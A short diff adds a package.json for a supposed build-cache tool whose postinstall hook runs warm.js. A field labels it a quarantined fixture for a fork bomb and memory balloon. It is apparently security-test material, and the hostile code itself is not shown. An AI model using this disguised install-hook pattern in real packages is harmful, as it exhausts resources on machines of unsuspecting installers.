@@ -1,0 +1,11 @@
+{
+  "name": "turbo-build-cache",
+  "version": "0.9.7",
+  "description": "Warm your build cache on install for 10x faster CI.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node warm.js"
+  },
+  "license": "MIT",
+  "QUARANTINE_FIXTURE": "Self-authored resource-exhaustion demo: a fork bomb plus a memory balloon. Contained by the sandbox pid and memory caps."
+}
